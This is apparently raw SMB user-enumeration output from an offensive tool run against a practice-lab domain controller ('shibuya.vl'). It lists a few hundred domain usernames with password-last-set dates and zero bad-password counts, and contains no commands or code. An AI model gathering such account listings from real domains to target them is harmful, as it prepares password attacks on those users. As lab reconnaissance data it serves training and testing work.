SMB         shibuya.vl      445    AWSJPDC0522      Terry.Sharp                   2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Rosie.Williams                2025-02-16 10:23:39 0
SMB         shibuya.vl      445    AWSJPDC0522      Dominic.Jones                 2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Dorothy.Turner                2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Oliver.Rees                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Lewis.Robson                  2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Gould                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Max.Clark                     2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Oliver.Smith                  2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Ronald.Martin                 2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Donald.Dunn                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexander.Wilson              2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Geoffrey.Griffiths            2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Olivia.Gibson                 2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Mitchell.Jones                2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Philip.Stephens               2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Jeremy.Riley                  2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Louis.Wood                    2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Leanne.Williams               2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Lisa.Harper                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Marilyn.Jordan                2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Jenna.Jones                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Marie.Chadwick                2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Sandra.Ward                   2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Stacey.Murray                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Katy.Jones                    2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Tina.Lee                      2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Arthur.Cox                    2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Gareth.Brown                  2025-02-16 10:23:40 0
SMB         shibuya.vl      445    AWSJPDC0522      Gillian.Wallace               2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Damien.Thompson               2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Harry.Turner                  2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Terry.Green                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Jade.Pearson                  2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Hugh.Wright                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Jonathan.Pugh                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Melanie.Grant                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Jeffrey.Taylor                2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Lauren.Turner                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Jeffrey.Harrison              2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Tony.Benson                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Tony.Owens                    2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Rosie.O'Donnell               2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Abdul.Smart                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Kyle.Chambers                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Terry.Howard                  2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Pamela.Knowles                2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Dylan.Allen                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Kerry.Bailey                  2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Stuart.Fletcher               2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Shaun.Campbell                2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Beverley.Willis               2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Chelsea.Green                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Lydia.Bates                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Bernard.Lewis                 2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Julia.Allen                   2025-02-16 10:23:41 0
SMB         shibuya.vl      445    AWSJPDC0522      Luke.Boyle                    2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Helen.Dickinson               2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Bryan.Arnold                  2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Dorothy.Power                 2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Irene.Nicholson               2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgina.Cameron              2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Amber.Webster                 2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Lawrence.Jones                2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Gavin.Patel                   2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Dylan.Brown                   2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Janet.Banks                   2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Ann.Davies                    2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Jade.Hunter                   2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Diane.West                    2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynda.Woodward                2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Hilary.Hilton                 2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Lisa.Quinn                    2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexandra.Vincent             2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Kenneth.Cunningham            2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Tom.Hunt                      2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Hilary.Davies                 2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Lorraine.Williams             2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Mathew.Cook                   2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Chloe.Williams                2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Robert.Reynolds               2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Marion.Thompson               2025-02-16 10:23:42 0
SMB         shibuya.vl      445    AWSJPDC0522      Callum.Miles                  2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Alice.Day                     2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracy.Jones                   2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Vanessa.Cooke                 2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Karen.Stephenson              2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Vanessa.Dixon                 2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Kelly.Robertson               2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Timothy.Jones                 2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Josh.Rees                     2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Leslie.Lloyd                  2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Kayleigh.Roberts              2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Jonathan.Brady                2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Leah.Parry                    2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Dale.Thomas                   2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Eleanor.Hamilton              2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Kenneth.Coleman               2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Christian.Marsden             2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Antony.Storey                 2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Dominic.Wilson                2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Angela.Grant                  2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Ian.Barker                    2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Pamela.Bennett                2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Little                  2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Butler                   2025-02-16 10:23:43 0
SMB         shibuya.vl      445    AWSJPDC0522      Nigel.Mills                   2025-02-19 08:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Leanne.Gill                   2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Stuart.Taylor                 2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Deborah.Graham                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Mitchell.Winter               2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Paula.Davies                  2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Barbara.Rowley                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynda.Nash                    2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Kyle.Hill                     2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Lesley.Lynch                  2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Beth.Baker                    2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Julie.Davies                  2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Irene.Allan                   2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Thomas.Brookes                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Russell.Phillips              2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Donna.Green                   2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Natalie.Knowles               2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Toby.Lamb                     2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Jayne.Barnes                  2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Watson                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Adam.Long                     2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Jean.Allen                    2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Lauren.Walters                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Leanne.Bentley                2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Kieran.Miller                 2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Holly.Bradley                 2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Jodie.Khan                    2025-02-16 10:23:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Smith                   2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Jeremy.Howells                2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Elliott.Storey                2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Denise.Harvey                 2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Ann.Kaur                      2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Damian.Marshall               2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Colin.Gibson                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgina.Long                 2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Bernard.Bevan                 2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Lawrence.Collins              2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Lee.Hunt                      2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Marcus.Collins                2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexander.Mitchell            2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Keith.Wilson                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Joan.Taylor                   2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Simon.Watson                  2025-02-18 19:35:44 0
SMB         shibuya.vl      445    AWSJPDC0522      Duncan.Roberts                2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Hazel.Wright                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Paul.Smith                    2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Martyn.Thompson               2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Victor.Ellis                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Aaron.Howard                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Brenda.Reynolds               2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Lawrence.Morton               2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      George.Hill                   2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Leslie.Smith                  2025-02-16 10:23:45 0
SMB         shibuya.vl      445    AWSJPDC0522      Gillian.Jones                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Maureen.Hill                  2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Megan.James                   2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Nathan.Moss                   2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Damian.Wilson                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Paige.Murphy                  2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Shirley.Parker                2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Maurice.Hill                  2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Sandra.Williams               2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Ian.Newton                    2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Lorraine.Cox                  2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Abbie.Ford                    2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Eileen.Greenwood              2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Anthony.Clayton               2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Oliver.Allen                  2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Harry.King                    2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Vincent.Graham                2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Amanda.Parkin                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Stephanie.Potter              2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Melissa.Jones                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Michelle.Johnston             2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Jamie.Jones                   2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Anthony.Webster               2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracy.Godfrey                 2025-02-16 10:23:46 0
SMB         shibuya.vl      445    AWSJPDC0522      Brian.Singh                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Shirley.Fuller                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Beth.Campbell                 2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Clifford.Robinson             2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Bibi                     2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Lauren.Wilkinson              2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Lucy.Evans                    2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Damien.Jenkins                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Charlotte.Brooks              2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Alison.Chapman                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Roy.Knowles                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Sally.Wilson                  2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Clive.Hamilton                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Samuel.Herbert                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Jake.Young                    2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Louis.Brown                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Gavin.Harvey                  2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexandra.Wright              2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Samantha.Singh                2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Alan.Carter                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Reece.Taylor                  2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Paula.Green                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      George.Clark                  2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Arthur.Morris                 2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Carly.Price                   2025-02-16 10:23:47 0
SMB         shibuya.vl      445    AWSJPDC0522      Jamie.Hardy                   2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Brandon.Jones                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Hollie.Clark                  2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Melanie.Lambert               2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Leanne.Hughes                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Roger.Wright                  2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Dorothy.Fletcher              2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Gerald.Cox                    2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Hayley.Parkinson              2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Declan.Walker                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Christine.Lamb                2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Danny.Barnett                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Marilyn.Barnett               2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Liam.Webster                  2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Williams                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Steven.Fraser                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexander.Jones               2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Smith                  2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Owen.Page                     2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Christopher.Jones             2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Jeffrey.Wallis                2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Adrian.Lowe                   2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Sophie.Macdonald              2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Anna.James                    2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Chloe.Parsons                 2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Jade.Graham                   2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Simon.Griffiths               2025-02-16 10:23:48 0
SMB         shibuya.vl      445    AWSJPDC0522      Kate.Matthews                 2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Craig.Freeman                 2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Howard.Dickinson              2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracey.Marsden                2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Arthur.Mitchell               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Craig.Wright                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Lynne.Parker                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Kerry.Walton                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Marilyn.Clarke                2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Sally.Brown                   2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Alex.Thornton                 2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Keith.Macdonald               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Mary.Bird                     2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Gary.Wood                     2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Bradley.Smith                 2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Trevor.Williams               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Joanna.Brown                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Caroline.Smith                2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Sheila.O'Donnell              2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Jacqueline.Hall               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Charlene.Hudson               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Gregory.Smith                 2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Bailey                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Alison.Ahmed                  2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Kerry.Hall                    2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Holly.Alexander               2025-02-16 10:23:49 0
SMB         shibuya.vl      445    AWSJPDC0522      Paula.Sutton                  2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Phillip.Parsons               2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Elizabeth.Adams               2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Connor.Henderson              2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Fiona.Fuller                  2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Danny.Brown                   2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Carly.Jones                   2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Stacey.Jones                  2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Joel.Taylor                   2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      June.Evans                    2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Linda.Pearce                  2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Holly.Shaw                    2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Carolyn.Hussain               2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Gareth.Davies                 2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Charlotte.Wright              2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Georgina.Macdonald            2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Emily.Cook                    2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Terence.Richards              2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Aimee.Khan                    2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Martin.Lane                   2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Roger.Warren                  2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Joe.Mann                      2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Lydia.Moore                   2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Frederick.Gordon              2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Shepherd                2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Rita.Smith                    2025-02-16 10:23:50 0
SMB         shibuya.vl      445    AWSJPDC0522      Edward.Parker                 2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Emma.Chamberlain              2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Helen.Harvey                  2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Zoe.Dawson                    2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Kimberley.Johnson             2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Alexander.Carey               2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Billy.Blackburn               2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Graham.Wallace                2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Lydia.Smith                   2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Marian.Stewart                2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Dennis.Williams               2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Kenneth.Shaw                  2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Kim.Smith                     2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Guy.Russell                   2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Amber.Fowler                  2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Tracy.O'Sullivan              2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Charlene.Norman               2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Glenn.Bibi                    2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Leslie.Holmes                 2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Tom.Read                      2025-02-16 10:23:51 0
